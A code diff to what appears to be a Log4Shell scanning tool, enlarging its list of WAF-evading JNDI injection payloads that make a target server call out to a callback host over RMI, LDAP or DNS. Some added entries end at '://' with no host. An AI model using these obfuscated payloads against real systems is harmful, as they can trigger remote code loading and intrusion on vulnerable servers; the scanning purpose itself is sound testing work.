@@ -50,14 +50,22 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+waf_bypass_payloads = [
+    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
+    "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+    "${jndi:rmi://{{callback_host}}}",
+    "${${::-j}ndi:rmi://{{callback_host}}}",
+    "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${upper:jndi}:${upper:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+    "${jndi:dns://{{callback_host}}}",
+    "${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://",
+    "${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://{{callback_host}}}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://",
+    "${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://"
+]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
